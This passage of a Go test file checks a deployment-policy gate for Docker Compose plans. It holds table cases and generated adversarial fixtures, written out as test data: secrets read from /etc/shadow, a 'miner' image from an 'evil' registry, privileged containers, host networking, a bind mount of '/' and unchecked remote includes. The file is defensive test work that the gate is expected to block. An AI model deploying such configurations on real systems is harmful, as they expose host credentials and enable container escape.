		{"secret file inside ./secrets", service("    secrets: [db]\n") + "secrets:\n  db: {file: ./secrets/db}\n", policy.OK, nil, nil},
		{"secret file elsewhere", service("    secrets: [db]\n") + "secrets:\n  db: {file: /etc/shadow}\n", policy.Deny, nil, nil},
		{"env_file read on the host", service("    env_file: [/data/exports/other/.env]\n"), policy.Deny, nil, nil},
		{"label_file read on the host", service("    label_file: [./labels]\n"), policy.Deny, nil, nil},
		{"syslog logging to another host", service("    logging:\n      driver: syslog\n      options: {syslog-address: 'udp://logs.example:514'}\n"), policy.Warn, nil, nil},
		{"json-file logging", service("    logging:\n      driver: json-file\n      options: {max-size: 10m}\n"), policy.OK, nil, nil},
		{"journald logging", service("    logging:\n      driver: journald\n"), policy.OK, nil, nil},
		{"low published port", service("    ports: ['80:80']\n"), policy.Need, nil, nil},
		{"loopback published port", service("    ports: ['127.0.0.1:8080:80']\n"), policy.OK, nil, nil},
		{"host port range starting low", service("    ports: ['80-90:8080']\n"), policy.Need, nil, nil},
		{"long syntax host port range starting low", service("    ports:\n      - {target: 8080, published: '80-90'}\n"), policy.Need, nil, nil},
		{"loopback host port range from 1024", service("    ports: ['127.0.0.1:1024-1030:8080']\n"), policy.OK, nil, nil},
		{"image outside allowlist", "services:\n  app:\n    image: evil.example/miner:1\n", policy.Deny, nil, nil},
		{"include brings in unchecked services", "include:\n  - oci://registry.example/evil/compose:1\n" + service(""), policy.Deny, nil, nil},
		{"include in a later document", service("") + "---\ninclude:\n  - other.yaml\n", policy.Deny, nil, nil},
		{"include behind a merge key", "x-base: &base\n  include:\n    - other.yaml\n<<: *base\n" + service(""), policy.Deny, nil, nil},
		{"include behind an alias key", "x-key: &key include\n*key :\n  - other.yaml\n" + service(""), policy.Deny, nil, nil},
		{"include only inside an extension", "x-notes:\n  include: other.yaml\n" + service(""), policy.OK, nil, nil},
	}
	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			plan := goodPlan()
			plan.Needs = testCase.needs
			input := baseInput(plan)
			input.Profile.Storage.BasePath = base
			input.GrantedNeeds = testCase.granted
			report := policy.EvaluateYAML(context.Background(), loadCompose(t, testCase.yaml), []byte(testCase.yaml), input)
			if report.Worst() != testCase.want {
				t.Fatalf("worst = %s, want %s: %+v", report.Worst(), testCase.want, report.Findings)
			}
		})
	}
}

// TestAdversarialCorpus decodes every hostile plan in testdata/adversarial;
// each must be rejected by the decoder or blocked by the gate.
func TestAdversarialCorpus(t *testing.T) {
	if *generate {
		writeAdversarial(t)
	}
	files, err := filepath.Glob(filepath.Join(adversarialDir, "*.json"))
	if err != nil || len(files) == 0 {
		t.Fatalf("no adversarial fixtures in %s", adversarialDir)
	}
	for _, file := range files {
		t.Run(filepath.Base(file), func(t *testing.T) {
			content, err := os.ReadFile(file)
			if err != nil {
				t.Fatal(err)
			}
			plan, err := ir.Decode(content)
			if err != nil {
				return
			}
			if report := policy.Evaluate(baseInput(plan)); !report.Blocked() {
				t.Fatalf("%s passed the gate: %+v", file, report.Findings)
			}
		})
	}
}

// writeAdversarial materialises the scenario cases, plus hostile documents
// that only exist as raw JSON (keys the IR has no field for).
func writeAdversarial(t *testing.T) {
	t.Helper()
	if err := os.MkdirAll(adversarialDir, 0o750); err != nil {
		t.Fatal(err)
	}
	for _, testCase := range planCases {
		if testCase.scenario == "" {
			continue
		}
		plan := goodPlan()
		testCase.mutate(plan)
		writeJSON(t, testCase.scenario, plan)
	}
	raw := map[string]string{
		"privileged-field":   `"role":"app","privileged":true`,
		"network-mode-field": `"role":"app","network_mode":"host"`,
		"bind-source-field":  `"name":"miniflux-db","source":"/"`,
		"build-field":        `"role":"app","build":"."`,
	}
	encoded, _ := json.Marshal(goodPlan())
	for name, replacement := range raw {
		target := strings.SplitN(replacement, ",", 2)[0]
		injected := strings.Replace(string(encoded), target, replacement, 1)
		if err := os.WriteFile(filepath.Join(adversarialDir, name+".json"), []byte(injected), 0o600); err != nil {
			t.Fatal(err)
		}
	}
}

func writeJSON(t *testing.T, name string, value any) {
	t.Helper()
	encoded, err := json.MarshalIndent(value, "", "  ")
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(adversarialDir, name+".json"), append(encoded, '\n'), 0o600); err != nil {
		t.Fatal(err)
	}
}

func FuzzEvaluate(f *testing.F) {
	seed, _ := json.Marshal(goodPlan())
	f.Add(seed)
	f.Fuzz(func(t *testing.T, data []byte) {
		plan, err := ir.Decode(data)
		if err != nil {
			return
		}
		_ = policy.Evaluate(baseInput(plan))
	})
}

func TestMergeListsARepeatedFindingOnce(t *testing.T) {
	plan := policy.Report{Findings: []policy.Finding{{Rule: "P1", Severity: policy.Deny, Service: "app", Message: "outside the allowlist"}}}
	rendered := policy.Report{Findings: []policy.Finding{
		{Rule: "P1", Severity: policy.Deny, Service: "app", Message: "outside the allowlist again"},
		{Rule: "P13", Severity: policy.Deny, Service: "app", Message: "host bind mount"},
	}}
	merged := plan.Merge(rendered)
	if len(merged.Findings) != 2 || merged.Findings[1].Rule != "P13" {
		t.Fatalf("merged: %+v", merged.Findings)
	}
}
